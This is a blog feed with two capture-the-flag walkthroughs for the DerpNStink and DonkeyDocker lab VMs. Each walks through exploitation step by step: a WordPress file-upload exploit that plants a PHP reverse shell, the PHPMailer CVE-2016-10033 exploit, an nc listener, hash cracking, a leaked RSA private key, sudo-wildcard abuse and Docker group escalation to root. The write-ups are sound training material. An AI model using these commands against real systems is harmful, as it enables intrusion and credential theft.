<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2019-05-19T20:52:52+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Derpnstink]]></title>
    <link href="http://chousensha.github.io/blog/2019/05/19/derpnstink/"/>
    <updated>2019-05-19T20:36:18+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/05/19/derpnstink</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs and it has 4 flags to collect.</p>

<blockquote><p>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live&hellip;</p></blockquote>

<!-- more -->


<p><code>
ORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
</code></p>

<p>Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:</p>

<p><img class="center" src="/images/pentest/derpnstink/derpnstink.png" title="&lsquo;derpnstink&rsquo; &lsquo;derpnstink&rsquo;" ></p>

<p>Let&rsquo;s check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a <em>/weblog</em> folder:</p>

<p><code>
/weblog (Status: 301)
</code></p>

<p>When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:</p>

<p><img class="center" src="/images/pentest/derpnstink/weblog.png" title="&lsquo;weblog&rsquo; &lsquo;weblog&rsquo;" ></p>

<p>This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:</p>

<p>```
[!] Title: WordPress 3.7-5.0 (except 4.9.9) &ndash; Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      &ndash; <a href="https://wpvulndb.com/vulnerabilities/9222">https://wpvulndb.com/vulnerabilities/9222</a>
 |      &ndash; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942</a>
 |      &ndash; <a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/</a></p>

<p> [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
  |     Fixed in: 1.4.7
  |     References:
  |      &ndash; <a href="https://wpvulndb.com/vulnerabilities/7532">https://wpvulndb.com/vulnerabilities/7532</a>
  |      &ndash; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460</a>
  |      &ndash; <a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>
  |      &ndash; <a href="https://www.exploit-db.com/exploits/34514/">https://www.exploit-db.com/exploits/34514/</a>
  |      &ndash; <a href="http://seclists.org/bugtraq/2014/Sep/1">http://seclists.org/bugtraq/2014/Sep/1</a>
  |      &ndash; <a href="http://packetstormsecurity.com/files/131526/">http://packetstormsecurity.com/files/131526/</a>
  |      &ndash; <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload">https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</a>
```</p>

<p>It seems not much can be done without authentication, so I went to wp-admin and enumerated the username <em>admin</em> as a valid user&hellip;and in the process also discovered that the password is <em>admin</em>..derp! Now I could use an <a href="https://www.exploit-db.com/exploits/34681">exploit for the authenticated arbitrary file upload</a> with <code>python gallery.py -t <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at <a href="http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php">http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php</a></p>

<p>From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:</p>

<p>```
/<em>* The name of the database for WordPress </em>/
define(&lsquo;DB_NAME&rsquo;, &lsquo;wordpress&rsquo;);</p>

<p>/<em>* MySQL database username </em>/
define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);</p>

<p>/<em>* MySQL database password </em>/
define(&lsquo;DB_PASSWORD&rsquo;, &lsquo;mysql&rsquo;);</p>

<p>/<em>* MySQL hostname </em>/
define(&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
```</p>

<p>Inside <code>/var/www/html/php/info.php</code> there is a line stating that there&rsquo;s a PHPMyAdmin interface:</p>

<p><code>
/* management interface can be found at /phpmyadmin
</code></p>

<p>I went to <a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a> and used the credentials to get in the wordpress database and get 2 users and hashes:</p>

<p><img class="center" src="/images/pentest/derpnstink/users.png" title="&lsquo;users&rsquo; &lsquo;users&rsquo;" ></p>

<p>We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password <em>wedgie57</em> for user <em>unclestinky</em>. My first move was to try SSH'ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials <em>stinky</em>:<em>wedgie57</em> (there was no unclestinky user configured on the system)</p>

<p>On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r <a href="ftp://derpnstink.local/files">ftp://derpnstink.local/files</a> &mdash;ftp-user=stinky &mdash;ftp-password=wedgie57</code></p>

<p><code>
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
226 Directory send OK.
ftp&gt; ls files
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp
</code></p>

<p>Inside network-logs there&rsquo;s a file that hints at some PCAP analysis:</p>

<p><code>
cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
</code></p>

<p>Inside <em>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</em> there&rsquo;s a private key:</p>

<p><code>
cat key.txt
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
</code></p>

<p>Now we can SSH on the box:</p>

<p>```
ssh -i stinky_key <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#115;&#116;&#105;&#110;&#x6b;&#121;&#x40;&#x64;&#101;&#114;&#x70;&#x6e;&#x73;&#x74;&#105;&#110;&#x6b;&#x2e;&#108;&#x6f;&#x63;&#x61;&#108;">&#115;&#116;&#x69;&#110;&#x6b;&#121;&#x40;&#100;&#101;&#114;&#112;&#110;&#x73;&#116;&#x69;&#x6e;&#x6b;&#x2e;&#108;&#111;&#99;&#x61;&#x6c;</a>
Ubuntu 14.04.5 LTS</p>

<pre><code>                   ,~~~~~~~~~~~~~..
                   '  Derrrrrp  N  `
    ,~~~~~~,       |    Stink      |
   / ,      \      ',  ________ _,"
  /,~|_______\.      \/
 /~ (__________)
(*)  ; (^)(^)':
    =;  ____  ;
      ; """"  ;=
</code></pre>

<p>   {&ldquo;}<em>   &lsquo; &rsquo;&rdquo;&ldquo;&lsquo; &rsquo; </em>{&rdquo;}
   _<em>/     >  &lt;   _</em>/</p>

<pre><code>  \    ,"   ",  /
   \  "       /"
      "      "=
       &gt;     &lt;
      ="     "-
      -`.   ,'
            -
        `--'
</code></pre>

<p>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>331 packages can be updated.
231 updates are security updates.</p>

<p>Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
stinky@DeRPnStiNK:~$
```</p>

<p>Inside Documents there&rsquo;s the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:</p>

<p><code>
user_login=mrderp
pass1=derpderpderpderpderpderpderp
</code></p>

<p>In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:</p>

<p>```
mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
From: Help Desk <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#104;&#x65;&#108;&#x70;&#100;&#x65;&#x73;&#x6b;&#x40;&#100;&#x65;&#114;&#112;&#x6e;&#115;&#116;&#105;&#x6e;&#x6b;&#46;&#108;&#111;&#x63;&#x61;&#x6c;">&#x68;&#x65;&#108;&#x70;&#x64;&#101;&#x73;&#107;&#x40;&#100;&#101;&#114;&#112;&#110;&#115;&#116;&#x69;&#110;&#107;&#46;&#108;&#111;&#99;&#97;&#108;</a>
Date: Thu, Aug 23, 2017 at 1:29 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.</p>

<p>Help Desk Ticket Notification
Thank you for contacting the Help Desk. Your ticket information is below. If you have any
additional information to add to this ticket, please reply to this notification.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us. Note that the Help Desk&rsquo;s busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).</p>

<p>Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: Sudoers File issues
Ticket Number: 242
Status: Break/fix
Date Created: 08/23/2017
Latest Update Date: 08/23/2017
Contact Name: Mr Derp
CC’s: Uncle Stinky
Full description and latest notes on your Ticket: Sudoers File issues
Notification</p>

<p>Regards,
Service Desk</p>

<p>Listen with focus, answer with accuracy, assist with compassion.</p>

<p>From: Help Desk
Date: Mon, Sep 10, 2017 at 2:53 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.</p>

<p>Closed Ticket Notification</p>

<p>Thank you for contacting the Help Desk. Your ticket information and its resolution is
below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
assistance, please reply to this notification to provide additional information.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us or visit our Self Help Web page at <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a>
Note that the Help Desk&rsquo;s busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).
Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: sudoers issues
Ticket Number: 242
Status: Closed
Date Created: 09/10/2017
Latest Update Date: 09/10/2017
CC’s:
Resolution: Closing ticket. ticket notification.</p>

<p>Regards,
eRA Service Desk
Listen with focus, answer with accuracy, assist with compassion.
For more information, dont forget to visit the Self Help Web page!!!
```</p>

<p>On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:</p>

<p>```
mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt</p>

<hr />

<p>On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.</p>

<p>However i dont want to specify each command to allow</p>

<p>How can I exclude these commands from password protection to sudo?</p>

<hr />

<hr />

<p>Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.</p>

<p>Please contact the Client Support team at <a href="https://pastebin.com/RzK9WfGw">https://pastebin.com/RzK9WfGw</a> if you have any further questions or issues.</p>

<p>Thank you for using our product.</p>

<hr />

<p>```</p>

<p>Running a <strong>sudo -l</strong> gives us the sudo commands that mrderp can run:</p>

<p>```
User mrderp may run the following commands on DeRPnStiNK:</p>

<pre><code>(ALL) /home/mrderp/binaries/derpy*
</code></pre>

<p>```</p>

<p>All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:</p>

<p><code>
mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
[sudo] password for mrderp:
root@DeRPnStiNK:~/binaries#
</code></p>

<p>Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:</p>

<p>```
root@DeRPnStiNK:/root# cat Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)</p>

<p>Congrats on rooting my first VulnOS!</p>

<p>Hit me up on twitter and let me know your thoughts!</p>

<p>@securekomodo
```</p>

<p>```</p>

<hr />

<p>/ You need more time; and you probably \</p>

<h2>\ always will.                         /</h2>

<pre><code>   \   ^__^
    \  (oo)\_______
       (__)\       )\/\
           ||----w |
           ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Donkey Docker]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/15/donkey-docker/"/>
    <updated>2019-04-15T21:02:36+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/15/donkey-docker</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is called DonkeyDocker, so we should expect a Docker component! The level is intermediate to hard.</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 3 disallowed entries
|_/contact.php /index.php /about.php
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Docker Donkey
</code></p>

<p>Not much to work with, let&rsquo;s hit the web server first. Nothing interesting on the home page and the contact page d, but going to the about page gives an error that something went wrong.</p>

<p>In the HTML source, I found a comment:</p>

<p>``` html</p>

<!-- FIXME!: www-path: /www -->


<p>```</p>

<p>Didn&rsquo;t find such a path with my enumeration. I fired up Gobuster next:</p>

<p><code>
gobuster -u http://192.168.159.132/ -w /usr/share/wordlists/dirb/big.txt -q -t 20
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/about (Status: 200)
/assets (Status: 301)
/contact (Status: 200)
/css (Status: 301)
/dist (Status: 301)
/index (Status: 200)
/mailer (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
</code></p>

<p>Trying those folders gave me 403 errors, so the next thing I did was to enumerate those folders themselves, and got an interesting hit with the /mailer folder:</p>

<p><code>
gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/LICENSE (Status: 200)
/docs (Status: 301)
/examples (Status: 301)
/extras (Status: 301)
/language (Status: 301)
/test (Status: 301)
</code></p>

<p>Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to <a href="http://192.168.159.132/mailer/VERSION">http://192.168.159.132/mailer/VERSION</a> and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:</p>

<blockquote><p>PHPMailer versions up to and including 5.2.19 are affected by a
 vulnerability which can be leveraged by an attacker to write a file
 with partially controlled contents to an arbitrary location through
 injection of arguments that are passed to the sendmail binary. This
 module writes a payload to the web root of the webserver before then
 executing it with an HTTP request. The user running PHPMailer must
 have write access to the specified WEB_ROOT directory and successful
 exploitation can take a few minutes.</p></blockquote>

<p>This one didn&rsquo;t work for me, so I found another one with <a href="https://www.exploit-db.com/exploits/40974">searchsploit</a>. To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:</p>

<p><code>python
target = 'http://192.168.159.132/contact'
</code></p>

<p>Per the <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">advisory</a>:</p>

<blockquote><p>To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.</p></blockquote>

<p>After finishing the modifications, I ran it:</p>

<p>``` plain
PHPMailer Exploit CVE 2016-10033 &ndash; anarcoder at protonmail.com
Version 1.0 &ndash; github.com/anarcoder &ndash; greetings opsxcq &amp; David Golunski</p>

<p>[+] SeNdiNG eVIl SHeLL To TaRGeT&hellip;.
[+] SPaWNiNG eVIL sHeLL&hellip;.. bOOOOM :D
```</p>

<p>With a listener on, I went to <a href="http://192.168.159.132/backdoor">http://192.168.159.132/backdoor</a> and got a reverse shell:</p>

<p><code>
nc -vnlp 9000
listening on [any] 9000 ...
connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@12081bd067cc:/www$
</code></p>

<p>From the hostname, we seem to be inside a Docker container. In the root directory I found a script:</p>

<p>```
www-data@12081bd067cc:/www$ cat /main.sh
cat /main.sh</p>

<h1>!/bin/bash</h1>

<h1>change permission</h1>

<p>chown smith:users /home/smith/flag.txt</p>

<h1>Start apache</h1>

<p>source /etc/apache2/envvars
a2enmod rewrite
apachectl -f /etc/apache2/apache2.conf</p>

<p>sleep 3
tail -f /var/log/apache2/*&amp;</p>

<h1>Start our fake smtp server</h1>

<p>python -m smtpd -n -c DebuggingServer localhost:25
```</p>

<p>Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:</p>

<p>```
smith@12081bd067cc:~$ ls -al
ls -al
total 28
drwx&mdash;&mdash;&mdash; 1 smith users 4096 Mar 26  2017 .
drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
-rw-r&mdash;r&mdash; 1 smith users  220 Nov  5  2016 .bash_logout
-rw-r&mdash;r&mdash; 1 smith users 3515 Nov  5  2016 .bashrc
-rw-r&mdash;r&mdash; 1 smith users  675 Nov  5  2016 .profile
drwx&mdash;S&mdash;&ndash; 2 smith users 4096 Mar 22  2017 .ssh
-rw-r&mdash;r&mdash; 1 smith users  237 Mar 22  2017 flag.txt
smith@12081bd067cc:~$ cat flag.txt
cat flag.txt
This is not the end, sorry dude. Look deeper!
I know nobody created a user into a docker
container but who cares? ;&ndash;)</p>

<p>But good work!
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}</p>

<p>PS: I like 1984 written by George ORWELL
```</p>

<p>Inside smith&rsquo;s home we also have a .ssh folder. Inside we have a pair of private-public keys.</p>

<p><code>
-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
</code></p>

<p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>

<p>```
ssh -i id_ed25519 <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#111;&#x72;&#119;&#x65;&#x6c;&#x6c;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#49;&#x35;&#57;&#46;&#x31;&#51;&#x32;">&#x6f;&#114;&#x77;&#x65;&#108;&#x6c;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#53;&#57;&#x2e;&#x31;&#51;&#x32;</a>
Welcome to</p>

<hr />

<p> |   \ <strong><em> _ _ | |</em></strong><strong> _  <em>|   \ </em></strong>  <strong>| |</strong><strong><em> _ _
 | |) / _ \ &lsquo; \| / / &ndash;</em>) || | |) / _ \/ <em>| / / &ndash;</em>) &rsquo;<em>|
 |</em></strong>/_<strong>/<em>||</em>|___</strong>|_, |<em><strong>/_</strong>/_</em>|<em>____|</em>|</p>

<pre><code>                    |__/
                         Made with &lt;3 v.1.0 - 2017
</code></pre>

<p>This is my first boot2root &ndash; CTF VM. I hope you enjoy it.
if you run into any issue you can find me on Twitter: @dhn_
or feel free to write me a mail to:</p>

<ul>
<li>Email: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#100;&#x68;&#110;&#64;&#122;&#101;&#x72;&#x30;&#45;&#100;&#x61;&#x79;&#x2e;&#x70;&#119;">&#x64;&#104;&#110;&#x40;&#x7a;&#x65;&#x72;&#x30;&#x2d;&#x64;&#97;&#121;&#x2e;&#112;&#119;</a></li>
<li>GPG key: 0x2641123C</li>
<li>GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C</li>
</ul>


<p>Level:       I think the level of this boot2root challange</p>

<pre><code>         is hard or intermediate.
</code></pre>

<p>Try harder!: If you are confused or frustrated don&rsquo;t forget</p>

<pre><code>         that enumeration is the key!
</code></pre>

<p>Thanks:      Special thanks to @1nternaut for the awesome</p>

<pre><code>         CTF VM name!
</code></pre>

<p>Feedback:    This is my first boot2root &ndash; CTF VM, please</p>

<pre><code>         give me feedback on how to improve!
</code></pre>

<p>Looking forward to the write-ups!</p>

<p>donkeydocker:~$
```</p>

<p>It worked! In orwell&rsquo;s home we find another flag:</p>

<p>```
donkeydocker:~$ ls -al /home/orwell
total 24
drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
-rw-r&mdash;r&mdash;    1 root     orwell           1 Mar 26  2017 .ash
-rw&mdash;&mdash;&mdash;&ndash;    1 orwell   orwell          45 Apr 15 18:12 .ash_history
drwx&mdash;S&mdash;&ndash;    2 orwell   users         4096 Mar 22  2017 .ssh
-rw-r&mdash;r&mdash;    1 orwell   orwell         104 Mar 22  2017 flag.txt
donkeydocker:~$ cat flag.txt
You tried harder! Good work ;&ndash;)</p>

<p>Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}
```</p>

<p>Now we seem to be on the Docker host itself. Let&rsquo;s confirm:</p>

<p><code>
donkeydocker:~$ docker ps
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80-&gt;80/tcp   donkeydocker
</code></p>

<p>We can see the container we were in previously. Now, for the next step, I used as reference this blog post about <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Docker privilege escalation</a>. The highlights are :</p>

<blockquote><p>If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</p>

<p>The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</p>

<p>The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
This effectively gives you root on the machine.</p></blockquote>

<p>And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:</p>

<p><code>
donkeydocker:~$ id
uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
</code></p>

<p>Let&rsquo;s look at the available containers now:</p>

<p><code>
donkeydocker:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker
</code></p>

<p>We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:</p>

<p><code>
donkeydocker:~$ docker run -d -v /:/host donkeydocker
103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863
</code></p>

<p>Now we should find the host / contents in the /host directory inside the container. Let&rsquo;s verify that it was created:</p>

<p><code>
donkeydocker:~$ docker container ls
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker
</code></p>

<p>And now we can run a root shell inside the container and read the host flag:</p>

<p>```
donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
root@103cd9c625b0:/# ls /host/root
donkeydocker  flag.txt
root@103cd9c625b0:/# cat /host/root/flag.txt
YES!! You did it :&ndash;). Congratulations!</p>

<p>I hope you enjoyed this CTF VM.</p>

<p>Drop me a line on twitter @dhn_, or via email <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x64;&#x68;&#x6e;&#64;&#x7a;&#101;&#x72;&#48;&#45;&#100;&#x61;&#x79;&#x2e;&#112;&#119;">&#100;&#x68;&#x6e;&#64;&#x7a;&#101;&#x72;&#x30;&#45;&#x64;&#x61;&#121;&#x2e;&#112;&#119;</a></p>

